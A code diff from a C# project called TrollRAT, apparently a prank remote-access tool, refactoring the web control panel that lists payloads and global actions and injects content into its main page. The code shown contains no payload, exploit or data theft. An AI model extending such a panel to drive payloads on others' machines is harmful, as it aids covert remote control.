@@ -1,46 +1,55 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Net;
 using System.Reflection;
 using System.Text;
 using System.Text.RegularExpressions;
-
+using TrollRAT.Actions;
 using TrollRAT.Payloads;
 using TrollRAT.Plugins;
+using TrollRAT.Utils;
 
 namespace TrollRAT.Server
 {
-    public class RootCommand : WebServerCommandBase
+    public class RootCommand : WebServerCommand
     {
         public override Regex Path => new Regex("^/?(index(\\.html|\\.php)?)?$");
 
-        private byte[] site;
+        private string site;
 
-        public RootCommand()
+        public RootCommand(WebServer server) : base(server)
         {
-            var assembly = Assembly.GetExecutingAssembly();
-            using (var stream = assembly.GetManifestResourceStream("TrollRAT.client.html"))
-            {
-                site = new byte[stream.Length];
-                stream.Read(site, 0, (int)stream.Length);
-            }
+            site = ResourceUtil.getResourceString("TrollRAT.Web.HTML.main.html");
         }
 
         public override void execute(HttpListenerContext context)
         {
-            respondBytes(site, context.Response, "text/html");
+            string newSite = site;
+
+            foreach (string placeholder in server.injections.Keys)
+            {
+                StringBuilder replacement = new StringBuilder();
+
+                foreach (string injection in server.injections[placeholder])
+                {
+                    replacement.Append(injection);
+                }
+
+                newSite = newSite.Replace(placeholder, replacement.ToString());
+            }
+
+            respondString(newSite, context.Response, "text/html");
         }
     }
 
     public class PayloadsCommand : WebServerCommand
     {
-        public PayloadsCommand(List<Payload> payloads) : base(payloads) { }
+        public PayloadsCommand(WebServer server) : base(server) { }
         public override Regex Path => new Regex("^/payloads$");
 
         public override void execute(HttpListenerContext context)
         {
             StringBuilder content = new StringBuilder();
-            foreach (Payload payload in payloads)
+            foreach (Payload payload in server.Payloads)
             {
                 content.Append("<a href=\"#\" onclick=\"onPayloadSelected(this);\" class=\"list-group-item clearfix\">");
                 content.Append(payload.Name);
@@ -64,6 +73,24 @@ namespace TrollRAT.Server
                 response = "<p>Nothing defined.</p>";
             }
 
+            respondString(response, context.Response, "text/html");
+        }
+    }
+
+    public class GlobalActionsCommand : WebServerCommand
+    {
+        public GlobalActionsCommand(WebServer server) : base(server) { }
+        public override Regex Path => new Regex("^/globalactions$");
+
+        public override void execute(HttpListenerContext context)
+        {
+            StringBuilder content = new StringBuilder();
+            foreach (GlobalAction action in server.Actions)
+            {
+                content.Append(action.getHTML() + "\n");
+            }
+
+            string response = content.ToString();
             respondString(response, context.Response, "text/html");
         }
     }
